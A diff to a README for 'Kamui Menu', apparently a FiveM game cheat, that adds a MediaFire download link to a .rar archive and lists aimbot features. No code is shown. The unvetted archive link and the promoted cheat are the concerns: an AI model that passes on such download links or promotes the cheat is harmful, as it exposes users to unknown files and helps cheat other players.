@@ -1,4 +1,9 @@
-# HOW TO USE 📜
+# Kamui Menu
+
+## Download 📦
+You can download the menu [HERE]([https://pages.github.com/](https://www.mediafire.com/file/2ql90wla76rcdp9/Kamui+Menu.rar/file))
+
+## HOW TO USE 📜
 
 1. Open FiveM
 2. Join a server
@@ -7,7 +12,7 @@
 
 Thank You For Using❤️
 
-# Features 📦
+## Features 🎈
 
 Aimbot - Visible check, magic bullet, adaptive weapon, fov, smooth, distance
 
